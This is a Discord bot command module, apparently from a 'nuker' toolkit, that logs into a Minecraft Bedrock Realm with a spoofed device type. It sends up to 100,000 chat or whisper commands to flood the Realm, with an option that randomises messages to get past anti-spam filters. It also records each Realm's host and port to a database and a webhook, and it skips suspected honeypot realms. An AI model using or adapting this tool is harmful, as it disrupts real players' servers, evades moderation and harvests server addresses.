const fs = require('fs');
const path = require('path');
const { Authflow } = require('prismarine-auth');
const { RealmAPI } = require('prismarine-realms');
const { SlashCommandBuilder, EmbedBuilder, WebhookClient } = require('discord.js');
const bedrock = require('bedrock-protocol');

// Define paths for JSON files
const blacklistPath = path.join(__dirname, '..', '..', 'data', 'blacklist.json');
const honeypotPath = path.join(__dirname, '..', '..', 'data', 'honeypot.json');
const databasePath = path.join(__dirname, '..', '..', 'data', 'database.json');

// Create webhook clients
const webhookLoggingClient = new WebhookClient({ url: '' });
const webhookDatabaseClient = new WebhookClient({ url: '' });
const trollEmojie = "<:HDtroll:1246615956176769024>";
const loadingemoji = "<a:loading:1256535355138768906>";
const workedEmojie = "<a:Check:1256612972793565204>";
const errorEmojie = "<:deny:1256622572762562681>";
const lEmoji = '<a:DyingLaughing:1244399086061355090>';
const one = '<:reply:1258168210486726726>';
const second = '<:replycountinue:1258168190861709484>';
const deviceOptions = {
    'Unknown': 0,
    'Android': 1,
    'iOS': 2,
    'OSX': 3,
    'FireOS': 4,
    'GearVR': 5,
    'Hololens': 6,
    'Windows 10 (x64)': 7,
    'Windows 10 (x86)': 8,
    'Dedicated Server': 9,
    'TvOS': 10,
    'Orbis': 11,
    'Nintendo Switch': 12,
    'Xbox': 13,
    'Windows Phone': 14,
    'Linux': 15
};

let blacklistedUsers = new Set();
try {
    const blacklistData = fs.readFileSync(blacklistPath, 'utf-8');
    blacklistedUsers = new Set(JSON.parse(blacklistData));
} catch (error) {
    console.error('Error loading blacklist:', error);
}

let honeypotRealms = new Set();
try {
    const honeypotData = fs.readFileSync(honeypotPath, 'utf-8');
    honeypotRealms = new Set(JSON.parse(honeypotData));
} catch (error) {
    console.error('Error loading honeypot data:', error);
}

async function handleInteraction(interaction, callback) {
    try {
        await callback();
    } catch (error) {
        if (error.code === 10062) {
            console.error('Unknown interaction error:', error);
            try {
                await interaction.followUp({ content: 'The interaction has expired or is unknown.', ephemeral: true });
            } catch (err) {
                console.error('Failed to follow up on interaction:', err);
            }
        } else {
            console.error('Error in handleInteraction:', error);
        }
    }
}

function colorizeText(text, rainbow) {
    if (!rainbow) return text; // Return the text unaltered if rainbow is false

    const words = text.split(' ');
    const coloredWords = words.map(word => {
        const colorCode = randomCode();
        return `${colorCode}${word}`;
    });
    return coloredWords.join(' ');
}

function randomCode() {
    const optionsString = "1234567890";
    const optionsArray = optionsString.split('');
    const randomIndex = Math.floor(Math.random() * optionsArray.length);
    const randomOption = optionsArray[randomIndex];
    return "§" + randomOption;
}

function generateRandomString(length) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function parseKickMessage(message) {
    return message; 
}


module.exports = {
    command: new SlashCommandBuilder()
        .setName('spam')
        .setDescription('Spams realm with a message')
        .addIntegerOption(option =>
            option.setName('spamtype')
                .setDescription('Type of spam command')
                .setRequired(true)
                .addChoices(
                    { name: '/me  | external', value: 1 },
                    { name: '/tell| external', value: 2 },
                    { name: '/msg | external', value: 4 }
                )
        )
        .addStringOption(option =>
            option.setName('realmid')
                .setDescription('Realm ID to Spam')
                .setRequired(true)
        )
        .addStringOption(option =>
            option.setName('custommessage')
                .setDescription('Custom message to spam')
                .setRequired(true)
        )
        .addStringOption(option =>
            option.setName('device_os')
                .setDescription('The device to spoof as')
                .setRequired(true)
                .addChoices(
                    { name: 'Unknown', value: 'Unknown' },
                    { name: 'Android', value: 'Android' },
                    { name: 'Samsung Smart fridge', value: 'Android' },
                    { name: 'iOS', value: 'iOS' },
                    { name: 'Ocean Gate', value: 'OSX' },
                    { name: 'OSX (macOS)', value: 'OSX' },
                    { name: 'FireOS', value: 'FireOS' },
                    { name: 'GearVR', value: 'GearVR' },
                    { name: 'Hololens', value: 'Hololens' },
                    { name: 'Windows 10 (x64)', value: 'Windows 10 (x64)' },
                    { name: 'Windows 10 (x86)', value: 'Windows 10 (x86)' },
                    { name: 'Dedicated Server', value: 'Dedicated Server' },
                    { name: 'TvOS', value: 'TvOS' },
                    { name: 'Orbis', value: 'Orbis' },
                    { name: 'Nintendo Switch', value: 'Nintendo Switch' },
                    { name: 'Xbox', value: 'Xbox' },
                    { name: 'Windows Phone', value: 'Windows Phone' },
                    { name: 'Linux', value: 'Linux' }
                )
        )
        .addIntegerOption(option =>
            option.setName('packets')
                .setDescription('Number of packets to send')
                .setRequired(true)
                .addChoices(
                    { name: '10K', value: 10000 },
                    { name: '50K', value: 50000 },
                    { name: '100K', value: 100000 }
                )
        )
        .addBooleanOption(option =>
            option.setName('rainbow')
                .setDescription('Rainbow text option')
                .setRequired(false)
        )
        .addBooleanOption(option =>
            option.setName('bypass')
                .setDescription('Anti-spam bypass option')
                .setRequired(false)
        ),

    callback: async (interaction) => {
        await handleInteraction(interaction, async () => {
            await interaction.deferReply({ ephemeral: true });

            if (blacklistedUsers.has(interaction.user.id)) {
                await handleBlacklist(interaction);
                return;
            }

            const userIdentifier = 'unique_identifier';// https://www.youtube.com/watch?v=pbH0UasFvd8 watching rn 
            const cacheDir = './';
            const flow = new Authflow(userIdentifier, cacheDir);

            try {
                const realmId = interaction.options.getString('realmid');
                const customMessage = interaction.options.getString('custommessage');
                const deviceOS = interaction.options.getString('device_os');
                const packetCount = interaction.options.getInteger('packets');
                const spamType = interaction.options.getInteger('spamtype');
                const rainbow = interaction.options.getBoolean('rainbow') || false;
                const bypass = interaction.options.getBoolean('bypass') || false;

                if (!customMessage || customMessage.trim() === '') {
                    throw new Error('Custom message is undefined or empty.');
                }

                const realmData = await checkRealmId(realmId);

                if (realmData.playerCount === 0 || (realmData.status === 'error' && realmData.error.includes('503'))) {
                    await handleHoneypot(interaction, realmId, customMessage, deviceOS);
                    return;
                }

                const database = JSON.parse(fs.readFileSync(databasePath, 'utf-8'));
                if (!database.some(entry => entry['Realm ID'] === realmId)) {
                    await addRealmCode(realmId, realmData.realmName, realmData.host, realmData.port, interaction);
                }

                const token = await flow.getMinecraftJavaToken();
                console.log('Token obtained:', token);

                const client = bedrock.createClient({
                    authFlow: flow,
                    deviceOS: deviceOptions[deviceOS],
                    realms: {
                        realmInvite: `https://realms.gg/${realmId}`
                    }
                });

                let statusEmbed = new EmbedBuilder()
                    .setTitle(`${trollEmojie} Spamming ${realmId} ${trollEmojie}`)
                    .setDescription(`${second}Spamming ${realmId} \n${second}Sending ${packetCount} Packets \n${one}Spam Message : ${customMessage}`)
                    .setTimestamp()
                    .setColor(0xFF0000)
                    .addFields(
                        { name: 'Device', value: deviceOS, inline: false },
                        { name: 'Connected', value: loadingemoji, inline: false },
                        { name: 'Spammed', value: loadingemoji, inline: false },
                        { name: 'Disconnected', value: loadingemoji, inline: false }
                    )
                    .setFooter({ text: `This Command will be send to our Logging Channel ` });

                await interaction.editReply({ embeds: [statusEmbed], ephemeral: true });

                client.on('join', async () => {
                    setTimeout(() => {
                        let messageCount = 0;
                        const interval = setInterval(() => {
                            if (messageCount >= packetCount) {
                                clearInterval(interval);
                                return;
                            }

                            for (let i = 0; i < 5000 && messageCount < packetCount; i++) {
                                let message = customMessage + (bypass ? ` ${generateRandomString(8)}` : ' 0');
                                let command;
                                if (rainbow) {
                                    switch (spamType) {
                                        case 1:
                                            command = `/me ${colorizeText(message, true)}`;
                                            break;
                                        case 2:
                                            command = `/tell @a ${colorizeText(message, true)}`;
                                            break;
                                        case 4:
                                            command = `/msg @a ${colorizeText(message, true)}`;
                                            break;
                                        default:
                                            console.error('Invalid spam type');
                                    }
                                } else {
                                    switch (spamType) {
                                        case 1:
                                            command = `/me ${message} \n§4§l§ TSL §1§ Nuker §4§ on TOP`;
                                            break;
                                        case 2:
                                            command = `/tell @a ${message} \n§4§l§ TSL §1§ Nuker §4§ on TOP`;
                                            break;
                                        case 4:
                                            command = `/msg @a ${message} \n§4§l§ TSL §1§ Nuker §4§ on TOP`;
                                            break;
                                        default:
                                            console.error('Invalid spam type');
                                    }
                                }
                                if (spamType !== 3 && command) {
                                    client.queue('command_request', {
                                        command: command,
                                        internal: false,
                                        version: 66,
                                        origin: {
                                            type: 5,
                                            uuid: "",
                                            request_id: ""
                                        }
                                    });
                                }
                                messageCount += 1;
                            }
                        }, 50);

                        statusEmbed.spliceFields(2, 1, { name: 'Spammed', value: workedEmojie, inline: false });
                        interaction.editReply({ embeds: [statusEmbed], ephemeral: true });

                        setTimeout(() => {
                            client.disconnect();
                            statusEmbed.spliceFields(3, 1, { name: 'Disconnected', value: workedEmojie, inline: false });
                            interaction.editReply({ embeds: [statusEmbed], ephemeral: true });
                            console.log(`Disconnected from ${realmId}`);

                            const webhookEmbed = new EmbedBuilder()
                                .setTitle('Realm Spammed')
                                .setDescription(`User ${interaction.user.tag} used the \`/idspam\` command.`)
                                .setColor('Green')
                                .addFields(
                                    { name: 'Realm ID', value: realmId },
                                    { name: 'Spam type', value: spamType.toString() },
                                    { name: 'Message', value: customMessage },
                                    { name: 'Device', value: deviceOS }
                                )
                                .setTimestamp();

                            webhookLoggingClient.send({ embeds: [webhookEmbed] });
                        }, 3000);
                    }, 4000);
                });

                client.on('disconnect', async (packet) => {
                    if (packet.reason === 'disconnectionScreen.serverFull') {
                        statusEmbed.setColor(0xFF0000).addFields({ name: errorEmojie, value: 'Server is full.', inline: false });
                        await interaction.editReply({ embeds: [statusEmbed], ephemeral: true });
                        client.disconnect();  // Stop further operations
                    }
                });

                client.on('kick', async (reason) => {
                    statusEmbed.setColor(0xFF0000).addFields({ name: errorEmojie, value: parseKickMessage(reason.message), inline: false });
                    await interaction.editReply({ embeds: [statusEmbed], ephemeral: true });
                    client.disconnect();  // Stop further operations
                });

                client.on('error', async (err) => {
                    statusEmbed.setColor(0xFF0000).addFields({ name: errorEmojie, value: err.message, inline: false });
                    await interaction.editReply({ embeds: [statusEmbed], ephemeral: true });
                    client.disconnect();  // Stop further operations
                });

            } catch (error) {
                let statusEmbed = new EmbedBuilder()
                    .setColor(0xFF0000)
                    .setDescription(`${errorEmojie} Joining realm ${errorEmojie}  \n Error: ${error.message}`)
                    .addFields({ name: loadingemoji, value: error.message, inline: true })
                    .setTimestamp();
                await interaction.editReply({ embeds: [statusEmbed], ephemeral: true });
            }
        });
    }
};

async function handleBlacklist(interaction) {
    try {
        const embed = new EmbedBuilder()
            .setColor('#ff0000')
            .setTitle('Womp Womp')
            .setDescription(`${lEmoji} You are blacklisted ${lEmoji}`);
        await interaction.editReply({ embeds: [embed], ephemeral: false });

        const webhookEmbed = new EmbedBuilder()
            .setTitle('Blacklist Check')
            .setDescription(`User ${interaction.user.tag} attempted to use the \`/idspam\` command but is blacklisted.`)
            .setColor('#ff0000')
            .addFields(
                { name: 'Realm ID', value: interaction.options.getString('realmid') },
                { name: 'Message', value: interaction.options.getString('custommessage') },
                { name: 'Device', value: interaction.options.getString('device_os') }
            )
            .setTimestamp();

        await webhookLoggingClient.send({ embeds: [webhookEmbed] });
    } catch (error) {
        console.error('Failed to handle blacklist:', error);
    }
}

async function handleHoneypot(interaction, realmId, customMessage, deviceOS) {
    try {
        honeypotRealms.add(realmId);
        fs.writeFileSync(honeypotPath, JSON.stringify([...honeypotRealms], null, 2));

        const honeypotEmbed = new EmbedBuilder()
            .setColor('#ff0000')
            .setTitle('Honeypot Detected')
            .setDescription('This realm is a honeypot and cannot be joined.');
        await interaction.editReply({ embeds: [honeypotEmbed], ephemeral: true });

        const webhookHoneypotEmbed = new EmbedBuilder()
            .setTitle('Honeypot Detected')
            .setDescription(`User ${interaction.user.tag} attempted to join a honeypot realm.`)
            .setColor('#ff0000')
            .addFields(
                { name: 'Realm ID', value: realmId },
                { name: 'Message', value: customMessage },
                { name: 'Device', value: deviceOS }
            )
            .setTimestamp();

        await webhookLoggingClient.send({ embeds: [webhookHoneypotEmbed] });
    } catch (error) {
        console.error('Failed to handle honeypot:', error);
    }
}

async function checkRealmId(realmId) {
    const profilesFolder = './';
    const options = {
        authTitle: '00000000441cc96b',
        flow: 'live'
    };

    const userIdentifier = 'unique_identifier';
    const authFlow = new Authflow(userIdentifier, profilesFolder, options);
    const api = RealmAPI.from(authFlow, 'bedrock');

    try {
        const realm = await api.getRealm(realmId);
        if (!realm) {
            return { id: realmId, status: 'invalid' };
        }

        const address = await realm.getAddress();
        const realmData = await api.getRealm(realm.id);
        const playerCount = realmData.players.length;

        return {
            id: realmId,
            status: 'valid',
            realmName: realm.name,
            realmId: realm.id,
            host: address.host,
            port: address.port,
            playerCount
        };
    } catch (error) {
        if (error.message.includes('403')) {
            console.error('User found in block list:', error);
            throw new Error(`Could not join Realm : \n ${error}`);
        }
        if (error.message.includes('404')) {
            console.error('Invite link not found:', error);
            throw new Error('Invite link not found');
        }
        console.error('Error fetching realm data:', error);
        return { id: realmId, status: 'error', error: error.message };
    }
}

async function addRealmCode(realmId, name, host, port, interaction) {
    let databaseData = fs.readFileSync(databasePath, 'utf-8');
    let database = databaseData.trim() ? JSON.parse(databaseData) : [];

    if (database.some(entry => entry['Realm ID'] === realmId)) {
        database = database.filter(entry => entry['Realm ID'] !== realmId);
        fs.writeFileSync(databasePath, JSON.stringify(database, null, 2));
        return;
    }

    database.push({ Name: name, "Realm ID": realmId, IP: host, Port: port });
    fs.writeFileSync(databasePath, JSON.stringify(database, null, 2));

    try {
        await webhookDatabaseClient.send({
            content: `Realm ID: ${realmId}\nName: ${name}\nHost: ${host}\nPort: ${port}`
        });
        console.log('Realm ID sent to webhook successfully.');
    } catch (error) {
        console.error('Failed to send realm ID to webhook:', error);
    }

    await interaction.editReply({
        embeds: [
            new EmbedBuilder()
                .setColor('#00ff00')
                .setTitle('Success')
                .setDescription('The realm ID and associated information have been added to the database.')
        ],
        ephemeral: true
    });
}
